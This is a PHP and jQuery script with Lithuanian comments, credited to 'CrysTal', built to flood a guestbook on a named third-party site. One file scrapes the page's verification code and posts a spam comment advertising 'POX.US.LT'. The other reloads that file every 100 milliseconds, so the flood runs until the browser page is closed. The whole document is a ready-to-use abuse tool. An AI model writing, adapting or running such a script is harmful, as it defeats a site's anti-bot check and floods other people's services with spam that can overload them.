/////// fl.php failas. 

<?php 

echo '<div id="floodas">'; 
include 'fld.php'; 
echo '</div>'; 

?> 


<script src="http://code.jquery.com/jquery-latest.js"></script> 
<script> 
    $(document).ready(function(){ 
        setInterval(function() { 
            $("#floodas").load("fld.php"); 
        }, 100); 
    }); 

</script> 

//////// fld.php failas. 

<?php 

function curl($url){  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, $url);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  

$z=curl_exec($ch);  
curl_close($ch);  
return $z;  
}  

$i=curl("http://dbx.us.lt/knyga.php?id=");  

    preg_match('#<b>Kodas:</b> (.*?)<br/>#', $i, $kodass);  

    echo $kodass[1]; 


    function curls($url, $kodas, $komentaras) { 
 $ch = curl_init(); 
 curl_Setopt($ch, CURLOPT_URL, $url); 
 curl_Setopt($ch, CURLOPT_RETURNTRANSFER, true); 
 curl_Setopt($ch, CURLOPT_POSTFIELDS, array('aut'=>'aPacer' , 'komentaras'=> $komentaras, 'kodas'=> $kodas)); 
  
 $rez = curl_exec($ch); 
 curl_close($ch); 
 return $rez; 
} 

$rnd = rand(1, 999999); 
$kome = 'POX.US.LT '.$rnd.''; 
echo curls("http://dbx.us.lt/knyga.php?id=", $kodass[1], $kome); 

?> 


/////Norint naudoti atsidarykite fl.php failą. nereiks perkrauti puslapio floodas veiks kol neuzdarysite puslapio. 

//// Created by CrysTal
